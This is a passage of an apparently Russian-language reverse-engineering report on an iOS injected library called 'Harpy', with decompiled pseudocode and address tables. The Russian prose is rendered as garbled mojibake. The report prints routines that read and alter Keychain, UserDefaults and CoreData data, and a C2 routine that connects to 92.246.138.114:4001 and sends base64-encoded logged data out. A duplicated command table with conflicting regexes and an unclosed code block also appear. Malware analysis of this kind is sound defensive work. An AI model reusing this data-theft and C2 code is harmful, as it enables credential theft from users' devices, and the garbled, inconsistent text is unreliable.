    // –£–¥–∞–ª–µ–Ω–∏–µ –∑–∞–ø–∏—Å–∏
    SecItemDelete((CFDictionaryRef)query);
}
```

#### üíæ CoreData –æ–ø–µ—Ä–∞—Ü–∏–∏

| –ö–æ–º–∞–Ω–¥–∞ | –ê–¥—Ä–µ—Å —Å—Ç—Ä–æ–∫–∏ | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------|--------------|----------|
| `.harpy.update.coredata` | 0x50a70 | –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–ø–∏—Å–µ–π |
| `.harpy.read.app` | - | –ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è |

**Harpy_updateCoreData (0x47130)** ‚Äî –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è CoreData:
```c
// –ê–¥—Ä–µ—Å: 0x47130 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: Harpy_updateCoreData)
void Harpy_updateCoreData(script_data) {
    // –ü–∞—Ä—Å–∏–Ω–≥ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —Å–∫—Ä–∏–ø—Ç–∞
    // –ü–∞—Ç—Ç–µ—Ä–Ω: 0xD000000000000016 = ".harpy.update.coredata"
    
    // 1. –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ entity name
    String entityName = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
    
    // 2. –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ predicate format
    String predicateFormat = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
    
    // 3. –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è
    String newValue = StringProtocol.trimmingCharacters(in: .whitespacesAndNewlines);
    
    // 4. –°–æ–∑–¥–∞–Ω–∏–µ NSPredicate
    NSPredicate *predicate = [NSPredicate predicateWithFormat:predicateFormat];
    
    // 5. –°–æ–∑–¥–∞–Ω–∏–µ fetch request
    NSFetchRequest *request = [[NSFetchRequest alloc] init];
    [request setPredicate:predicate];
    
    // 6. –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
    // ... –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–ø–∏—Å–µ–π CoreData
}
```

#### üñ®Ô∏è –°–∏—Å—Ç–µ–º–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã

| –ö–æ–º–∞–Ω–¥–∞ | –ê–¥—Ä–µ—Å —Å—Ç—Ä–æ–∫–∏ | Regex –ø–∞—Ç—Ç–µ—Ä–Ω |
|---------|--------------|---------------|
| `.harpy.print(message:` | 0x50ad0 | –í—ã–≤–æ–¥ –≤ –ª–æ–≥ |
| `.harpy.execute(script:` | 0x50af0 | –†–µ–∫—É—Ä—Å–∏–≤–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ |
| `.harpy.write.file` | 0x50ab0 | –ó–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª |
| `.harpy.update.server` | 0x50a90 | –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–∞ |
| `.harpy(sleep:` | - | –ü–∞—É–∑–∞ (regex: `sleep:\s*(\d+)`) |
| `harpy(start)` | - | –ú–∞—Ä–∫–µ—Ä –Ω–∞—á–∞–ª–∞ —Å–∫—Ä–∏–ø—Ç–∞ |
| `.modifyrestart` | - | –§–ª–∞–≥ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞ |

**Harpy_executeScript (0x490C8)** ‚Äî –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –∏–∑ —Ñ–∞–π–ª–∞:
```c
// –ê–¥—Ä–µ—Å: 0x490C8 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: Harpy_executeScript)
void Harpy_executeScript(URL baseURL, String scriptName) {
    // 1. –ü–æ–ª—É—á–µ–Ω–∏–µ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö HarpyScript
    type_metadata_accessor_for_HarpyScript(0);
    
    // 2. –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏
    URL scriptURL = URL.appendingPathComponent(baseURL, scriptName);
    
    // 3. –ß—Ç–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–∞ –≤ UTF-8
    String scriptContent = String.init(contentsOf: scriptURL, encoding: .utf8);
    
    // 4. –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –≤—ã–∑–æ–≤ –ø–∞—Ä—Å–µ—Ä–∞
    HarpyScript_executeCommands(scriptContent);
}
```

**Harpy_createRegex (0x4AA48)** ‚Äî –°–æ–∑–¥–∞–Ω–∏–µ —Ä–µ–≥—É–ª—è—Ä–Ω–æ–≥–æ –≤—ã—Ä–∞–∂–µ–Ω–∏—è:
```c
// –ê–¥—Ä–µ—Å: 0x4AA48 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: Harpy_createRegex)
NSRegularExpression* Harpy_createRegex(String pattern, options) {
    NSError *error = nil;
    
    // –°–æ–∑–¥–∞–Ω–∏–µ NSRegularExpression
    NSRegularExpression *regex = [[NSRegularExpression alloc] 
        initWithPattern:pattern 
        options:options 
        error:&error];
    
    if (regex == nil) {
        // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è NSError –≤ Swift Error
        _convertNSErrorToError(error);
        swift_willThrow();
    }
    
    return regex;
}

#### üñ®Ô∏è –°–∏—Å—Ç–µ–º–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã

| –ö–æ–º–∞–Ω–¥–∞ | –ê–¥—Ä–µ—Å —Å—Ç—Ä–æ–∫–∏ | Regex –ø–∞—Ç—Ç–µ—Ä–Ω |
|---------|--------------|---------------|
| `.harpy.print(message:` | 0x50ad0 | –í—ã–≤–æ–¥ –≤ –ª–æ–≥ |
| `.harpy.execute(script:` | 0x50af0 | –†–µ–∫—É—Ä—Å–∏–≤–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ |
| `.harpy.write.file` | 0x50ab0 | –ó–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª |
| `.harpy.update.server` | 0x50a90 | –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–∞ |
| `.harpy(sleep:` | - | –ü–∞—É–∑–∞ (regex: `sleep:(\+\d\))`) |
| `harpy(start)` | - | –ú–∞—Ä–∫–µ—Ä –Ω–∞—á–∞–ª–∞ —Å–∫—Ä–∏–ø—Ç–∞ |
| `.modifyrestart` | - | –§–ª–∞–≥ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞ |

---

## ‚öôÔ∏è –ü–∞—Ä—Å–µ—Ä —Å–∫—Ä–∏–ø—Ç–æ–≤ (sub_42B54)

### –û–±—â–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ (~1883 —Å—Ç—Ä–æ–∫–∏)

```c
void __fastcall sub_42B54(__int64 script_data, __int64 script_bridge) {
    // 1. –ü–æ–ª—É—á–µ–Ω–∏–µ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö HarpyScript
    v6 = type_metadata_accessor_for_HarpyScript(0);
    
    // 2. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏—Ç–µ—Ä–∞—Ç–æ—Ä–∞
    v10 = (*(_QWORD *)(v9 + 16));  // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å—Ç—Ä–æ–∫
    
    // 3. –ì–ª–∞–≤–Ω—ã–π —Ü–∏–∫–ª –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥
    while (v10 > 0) {
        // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–π –ø–æ–¥—Å—Ç—Ä–æ–∫–∏
        v17 = *(v15 - 1);
        v20 = *v15;
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ "harpy(start)"
        strcpy(v464, "harpy(start)");
        if (StringProtocol.contains(v464)) {
            // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ State.wrappedValue = 1
            State.wrappedValue.setter(v464, outputState);
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ ".modifyrestart"
        strcpy(v464, ".modifyrestart");
        if (StringProtocol.contains(v464)) {
            // –í–∫–ª—é—á–µ–Ω–∏–µ —Ñ–ª–∞–≥–∞ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ ".harpy.edit.userdefaults"
        v464[0] = 0xD000000000000018LL;  // –î–ª–∏–Ω–∞ —Å—Ç—Ä–æ–∫–∏
        v464[1] = v441;  // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä–æ–∫—É
        if (StringProtocol.contains(v464)) {
            // –ü–∞—Ä—Å–∏–Ω–≥ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —á–µ—Ä–µ–∑ sub_48464
            result = sub_48464(script, pattern, value);
            // NSUserDefaults.setObject:forKey:
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ ".harpy.remove.userdefaults" (regex)
        v68 = objc_allocWithZone(&OBJC_CLASS___NSRegularExpression);
        v70 = sub_4AA48(pattern, 0);  // –°–æ–∑–¥–∞–Ω–∏–µ regex
        // NSRegularExpression.firstMatchInString:options:range:
        // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ capture group 1
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ ".harpy(sleep:"
        strcpy(v464, ".harpy(sleep:");
        if (StringProtocol.contains(v464)) {
            // Regex: sleep:(\+\d\)
            // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è –∑–∞–¥–µ—Ä–∂–∫–∏
            // –ü–∞—Ä—Å–∏–Ω–≥ —á–∏—Å–ª–∞
        }
        
        // –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç—Ä–æ–∫–µ
        v15 = v16 + 4;
        --v10;
    }
    
    // 4. –§–∏–Ω–∞–ª–∏–∑–∞—Ü–∏—è
    sub_49528(script_data, script_bridge);  // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
}
```

### Regex –ø–∞—Ç—Ç–µ—Ä–Ω—ã (sub_4AA48)

```c
// –°–æ–∑–¥–∞–Ω–∏–µ NSRegularExpression
id sub_4AA48(__int64 pattern_swift, __int64 pattern_bridge, __int64 options) {
    NSString *pattern = String._bridgeToObjectiveC()(pattern_swift, pattern_bridge);
    NSError *error = nil;
    NSRegularExpression *regex = [[NSRegularExpression alloc] 
        initWithPattern:pattern 
        options:options 
        error:&error];
    return regex;
}
```

### –ü–∞—Ä—Å–∏–Ω–≥ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ (sub_48464)

```c
__int64 sub_48464(__int64 script, __int64 key_pattern, __int64 value_pattern) {
    // –ü–æ–∏—Å–∫ –∫–ª—é—á–∞ –≤ —Å–∫—Ä–∏–ø—Ç–µ
    for (int i = 0; i < count; i++) {
        if (StringProtocol.contains(substring, key_pattern)) {
            // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è
            // Trim whitespace
            static CharacterSet.whitespacesAndNewlines.getter();
            result = StringProtocol.trimmingCharacters(in:);
            
            // –£–¥–∞–ª–µ–Ω–∏–µ –∫–∞–≤—ã—á–µ–∫
            CharacterSet.init(charactersIn:)("\"");
            return StringProtocol.trimmingCharacters(in:);
        }
    }
    return 0;
}
```

---

## üåê –°–µ—Ç–µ–≤–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å (C2)

### ‚ö†Ô∏è Command & Control Server

| –ü–∞—Ä–∞–º–µ—Ç—Ä | –ó–Ω–∞—á–µ–Ω–∏–µ |
|----------|----------|
| **IP-–∞–¥—Ä–µ—Å** | `92.246.138.114` |
| **–ü–æ—Ä—Ç** | `4001` |
| **–ü—Ä–æ—Ç–æ–∫–æ–ª** | TCP (Network.framework) |
| **API** | NWConnection |

### HarpyNetwork_connectToServer (0x2A2EC) ‚Äî C2 —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ

```c
// –ê–¥—Ä–µ—Å: 0x2A2EC (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: HarpyNetwork_connectToServer)
void HarpyNetwork_connectToServer() {
    // 1. –°–æ–∑–¥–∞–Ω–∏–µ endpoint
    // IP —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç—Å—è –∏–∑ –∫–æ–Ω—Å—Ç–∞–Ω—Ç:
    // 0x312E3634322E3239 = "29.246.1" (little-endian)
    // 0x003431312E383339 = "38.114" (little-endian)
    // –ò—Ç–æ–≥–æ: "92.246.138.114"
    NWEndpoint.Host host = NWEndpoint.Host.init(stringLiteral:)("92.246.138.114");
    
    // –ü–æ—Ä—Ç: 0xFA1 = 4001
    NWEndpoint.Port port = NWEndpoint.Port.init(integerLiteral:)(4001);
    
    // 2. –ü–æ–ª—É—á–µ–Ω–∏–µ TCP –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    NWParameters *params = NWParameters.tcp.getter();
    
    // 3. –°–æ–∑–¥–∞–Ω–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
    NWConnection *connection = NWConnection.__allocating_init(host:port:using:)(
        host, port, params);
    
    // 4. –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è -> sub_2D984
    NWConnection.stateUpdateHandler.setter(connection, sub_2D984);
    
    // 5. –ó–∞–ø—É—Å–∫ –Ω–∞ global queue —Å default QoS
    NWConnection.start(queue:)(connection, globalQueue);
}
```

### HarpyNetwork_onStateChange (0x2AA6C) ‚Äî –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ—Å—Ç–æ—è–Ω–∏—è

```c
// –ê–¥—Ä–µ—Å: 0x2AA6C (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: HarpyNetwork_onStateChange)
void HarpyNetwork_onStateChange(NWConnectionState state) {
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
    if (state == NWConnection.State.failed) {
        // –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã –Ω–∞ main queue
        dispatch_async_after(main_queue, 2.0, ^{
            // –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        });
    }
    else if (state == NWConnection.State.ready) {
        // –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ - –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
        HarpyNetwork_onConnectionReady(context);  // sub_2AE40
    }
}
```

### HarpyNetwork_onConnectionReady (0x2AE40) ‚Äî –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö

```c
// –ê–¥—Ä–µ—Å: 0x2AE40 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: HarpyNetwork_onConnectionReady)
void HarpyNetwork_onConnectionReady(context) {
    // 1. –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ª–æ–≥–≥–µ—Ä–∞ —á–µ—Ä–µ–∑ KeyPath
    KeyPath loggerPath = swift_getKeyPath(&unk_4FBB0);
    KeyPath dataPath = swift_getKeyPath(&unk_4FBD8);
    
    // 2. –ß—Ç–µ–Ω–∏–µ Published —Å–≤–æ–π—Å—Ç–≤–∞
    static Published.subscript.getter(&data, loggerPath, dataPath);
    
    // 3. –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –≤ UTF-8 Data
    Data utf8Data = StringProtocol.data(using: .utf8, allowLossyConversion: false);
    
    // 4. Base64 –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ
    String base64String = Data.base64EncodedString(options: []);
    
    // 5. –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ JSON payload
    struct TelegramPayload {
        String telegramId;    // "telegramId" = 0x6D617267656C6574 + 0xEA00000000006449
        String data;          // base64 encoded data
        String action;        // "action" = 0x6E6F69746361
        String status;        // "enable" (0x656C62616E65) –∏–ª–∏ "disable" (0x656C6261736964)
    };
    
    // 6. –ö–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ JSON
    JSONEncoder *encoder = JSONEncoder.init();
    Data jsonData = JSONEncoder.encode(payload);
    
    // 7. –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ NWConnection
    NWConnection.send(
        content: jsonData,
        contentContext: NWConnection.ContentContext.defaultMessage,
        isComplete: true,
        completion: .contentProcessed(HarpyNetwork_sendComplete)
    );
}
```

### HarpyNetwork_receiveData (0x2BB6C) ‚Äî –ü—Ä–∏–µ–º –¥–∞–Ω–Ω—ã—Ö

```c
// –ê–¥—Ä–µ—Å: 0x2BB6C (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: HarpyNetwork_receiveData)
void HarpyNetwork_receiveData(data, context, isComplete, error) {
    if (error == nil) {
        // –ü–∞—Ä—Å–∏–Ω–≥ JSON –æ—Ç–≤–µ—Ç–∞
        JSONDecoder *decoder = JSONDecoder.init();
        ResponsePayload response = JSONDecoder.decode(from: data);
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—à–∏–±–∫—É ("error" –≤ –æ—Ç–≤–µ—Ç–µ)
        if (swift_bridgeObjectRetain(response) && 
            sub_DB3C("error", 0xE500000000000000) != 0) {
            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–∫–∏
            dispatch_async(main_queue, ^{ /* ... */ });
        }
        else {
            // –û–±—Ä–∞–±–æ—Ç–∫–∞ —É—Å–ø–µ—à–Ω–æ–≥–æ –æ—Ç–≤–µ—Ç–∞
            // –ü—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ –ø—Ä–∏–µ–º–∞ –¥–∞–Ω–Ω—ã—Ö
            NWConnection.receive(
                minimumIncompleteLength: 1,
                maximumLength: 1024,
                completion: HarpyNetwork_receiveData
            );
        }
    }
}
```

### HarpyLogger ‚Äî –¢–µ–ª–µ–º–µ—Ç—Ä–∏—è

–ê–¥—Ä–µ—Å type metadata: `0x69700`

```c
// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Telegram Bot API
// Bot: @harpyapp_bot (https://t.me/harpyapp_bot)

struct HarpyLogger {
    String telegramBotToken;      // _telegramId (0x68950)
    String chatId;
    Bool isEnabled;
    NWConnection *c2Connection;
    Published<String> logData;    // @Published –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
};

// Strings:
// - "Data logging in telegram bot" (0x506c0)
// - "Your Telegram ID" (0x50700)
// - "_telegramId" / "_telegramID" (0x50804, 0x6105f, 0x61260)
```

### –í–Ω–µ—à–Ω–∏–µ URL

| URL | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ | –ê–¥—Ä–µ—Å —Å—Ç—Ä–æ–∫–∏ |
|-----|------------|--------------|
| `https://i.ibb.co/SKYxFp1/logos.png` | –õ–æ–≥–æ—Ç–∏–ø –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è | 0x50700 |
| `https://t.me/harpysupport` | –ü–æ–¥–¥–µ—Ä–∂–∫–∞ | 0x506xx |
| `https://t.me/harpyapp_bot` | Telegram –±–æ—Ç | 0x506E0 |
| `https://t.me/harpyapp` | –ö–∞–Ω–∞–ª Harpy | 0x50790 |
| `https://t.me/lurizevl` | –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ | 0x506xx |
| `https://t.me/imharpy` | –ü—Ä–æ—Ñ–∏–ª—å | 0x506xx |

---

## üì± UI —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ (SwiftUI)

### HarpyView.body (sub_363B8) ‚Äî ~983 —Å—Ç—Ä–æ–∫–∏

```swift
var body: some View {
    ZStack {
        // –§–æ–Ω
        Color.init(red: 0.945, green: 0.945, blue: 0.945, opacity: 1.0)
        
        VStack {
            // –õ–æ–≥–æ—Ç–∏–ø
            AsyncImage(url: URL(string: "https://i.ibb.co/SKYxFp1/logos.png"))
                .resizable()
                .padding(.horizontal, 25)
                .padding(.top, 10)
            
            // –ö–Ω–æ–ø–∫–∞ Start
            Button(action: { sub_38344() }, label: { sub_3859C() })
                .padding(EdgeInsets(top: 10, leading: 25, bottom: 10, trailing: 25))
            
            // –°–ø–∏—Å–æ–∫ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏
            NavigationLink(destination: GeneralView()) { /* ... */ }
            NavigationLink(destination: HarpyLogger()) { /* ... */ }
            NavigationLink(destination: HarpyBuy()) { /* ... */ }
            NavigationLink(destination: HarpyScript()) { /* ... */ }
            NavigationLink(destination: Scripting()) { /* ... */ }
        }
    }
    .cornerRadius(20, style: .continuous)
}
```

### –ö–Ω–æ–ø–∫–∞ Start (sub_4546C)

```swift
// sub_4546C - Start Button View
Button {
    // Action: sub_3BEE0 (Start monitoring)
} label: {
    Text("Start")
        .font(.title2.rounded.semibold)
        .foregroundColor(.white)
        .frame(height: 70)
        .background(
            RoundedRectangle(cornerRadius: 20)
                .fill(Color.black)
        )
        .padding(.horizontal, 25)
}
```

### UI Components Mapping

| –§—É–Ω–∫—Ü–∏—è | –û–ø–∏—Å–∞–Ω–∏–µ | SwiftUI –∫–æ–º–ø–æ–Ω–µ–Ω—Ç |
|---------|----------|-------------------|
| sub_363B8 | HarpyView.body | ZStack, VStack, Image |
| sub_43F0 | ContentView.body | ConditionalContent |
| sub_5198 | VStack builder | VStack with spacing |
| sub_3C768 | Rounded rectangle | RoundedRectangle, StrokeStyle |
| StartButton_createView (0x4546C) | Start button | Button, Text, Font |
| sub_3D4F4 | NavigationView | NavigationView, sheet |
| sub_2FA88 | HarpySettings | Image from URL, EdgeInsets |

---

## üó∫Ô∏è –ü–æ–ª–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–∞—è –∫–∞—Ä—Ç–∞ (—Å –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–Ω—ã–º–∏ —Ñ—É–Ω–∫—Ü–∏—è–º–∏)

### –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏ Lifecycle

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | –û–ø–∏—Å–∞–Ω–∏–µ |
|-------|---------|-----------|----------|
| 0x4000 | Entry Point | - | –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è dylib |
| 0xB77C | AppState.shared | - | Singleton accessor |
| 0x105F0 | Present UI | - | –ü–æ–∫–∞–∑ UI —á–µ—Ä–µ–∑ 1—Å |
| 0xC774 | Dismiss UI | - | –ó–∞–∫—Ä—ã—Ç–∏–µ UI |
| 0x3BEE0 | sub_3BEE0 | **AppState_onStartPressed** | –û–±—Ä–∞–±–æ—Ç—á–∏–∫ Start |
| 0x2D99C | sub_2D99C | **DispatchQueue_getMetadata** | DispatchQueue init |

### –ü–∞—Ä—Å–µ—Ä —Å–∫—Ä–∏–ø—Ç–æ–≤

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | –û–ø–∏—Å–∞–Ω–∏–µ |
|-------|---------|-----------|----------|
| 0x42B54 | sub_42B54 | **HarpyScript_executeCommands** | –ì–ª–∞–≤–Ω—ã–π –ø–∞—Ä—Å–µ—Ä DSL (~1883 —Å—Ç—Ä–æ–∫) |
| 0x48464 | sub_48464 | **Harpy_parseScriptCommand** | –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ |
| 0x490C8 | sub_490C8 | **Harpy_executeScript** | –ó–∞–≥—Ä—É–∑–∫–∞ –∏–∑ —Ñ–∞–π–ª–∞ |
| 0x47CFC | sub_47CFC | **Harpy_writeFile** | –ó–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª |
| 0x4AA48 | sub_4AA48 | **Harpy_createRegex** | –°–æ–∑–¥–∞–Ω–∏–µ NSRegularExpression |

### UserDefaults –æ–ø–µ—Ä–∞—Ü–∏–∏

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | –û–ø–µ—Ä–∞—Ü–∏—è |
|-------|---------|-----------|----------|
| 0x46654 | sub_46654 | **Harpy_readUserDefaults** | –ß—Ç–µ–Ω–∏–µ dictionaryRepresentation |
| 0x432C8 | sub_432C8 | - | setObject:forKey: |
| 0x44734 | sub_44734 | - | removeObjectForKey: |
| 0x43290 | sub_43290 | - | –ü–∞—Ä—Å–∏–Ω–≥ + —É—Å—Ç–∞–Ω–æ–≤–∫–∞ |

### Keychain –æ–ø–µ—Ä–∞—Ü–∏–∏

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | –û–ø–µ—Ä–∞—Ü–∏—è |
|-------|---------|-----------|----------|
| 0x46DC0 | sub_46DC0 | **Harpy_readKeychain** | SecItemCopyMatching (ALL) |
| 0x46C94 | sub_46C94 | **Harpy_editKeychain** | SecItemDelete |
| 0x44680 | sub_44680 | - | SecItemCopyMatching |
| 0x440C4 | sub_440C4 | - | SecItemUpdate |

### CoreData –æ–ø–µ—Ä–∞—Ü–∏–∏

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | –û–ø–µ—Ä–∞—Ü–∏—è |
|-------|---------|-----------|----------|
| 0x47130 | sub_47130 | **Harpy_updateCoreData** | NSPredicate + NSFetchRequest |
| 0x48C0C | sub_48C0C | - | –ß—Ç–µ–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ |

### –°–µ—Ç–µ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ (C2)

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | –û–ø–∏—Å–∞–Ω–∏–µ |
|-------|---------|-----------|----------|
| 0x2A2EC | sub_2A2EC | **HarpyNetwork_connectToServer** | TCP 92.246.138.114:4001 |
| 0x2AA6C | sub_2AA6C | **HarpyNetwork_onStateChange** | –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ—Å—Ç–æ—è–Ω–∏—è NWConnection |
| 0x2AE40 | sub_2AE40 | **HarpyNetwork_onConnectionReady** | –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ |
| 0x2B710 | sub_2B710 | **HarpyNetwork_sendComplete** | Callback –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ |
| 0x2BB6C | sub_2BB6C | **HarpyNetwork_receiveData** | –ü—Ä–∏–µ–º –¥–∞–Ω–Ω—ã—Ö –æ—Ç C2 |
| 0x2DC1C | sub_2DC1C | **HarpyLogger_wrapCallback** | –û–±–µ—Ä—Ç–∫–∞ –¥–ª—è –ª–æ–≥–≥–µ—Ä–∞ |
| 0xD8E0 | sub_D8E0 | - | NSData initWithContentsOfURL |

### UI —Ñ—É–Ω–∫—Ü–∏–∏

| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –ù–æ–≤–æ–µ –∏–º—è | View |
|-------|---------|-----------|------|
| 0x363B8 | sub_363B8 | - | HarpyView.body - –ì–ª–∞–≤–Ω—ã–π —ç–∫—Ä–∞–Ω |
| 0x43F0 | sub_43F0 | - | ContentView.body - Root view |
| 0x4546C | sub_4546C | **StartButton_createView** | –ö–Ω–æ–ø–∫–∞ Start |
| 0x2FA88 | sub_2FA88 | - | HarpySettings - –ù–∞—Å—Ç—Ä–æ–π–∫–∏ |
| 0x3D4F4 | sub_3D4F4 | - | NavigationView - –ù–∞–≤–∏–≥–∞—Ü–∏—è |
| 0x45AA4 | sub_45AA4 | - | File List - –°–ø–∏—Å–æ–∫ .txt —Ñ–∞–π–ª–æ–≤ |

### –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ

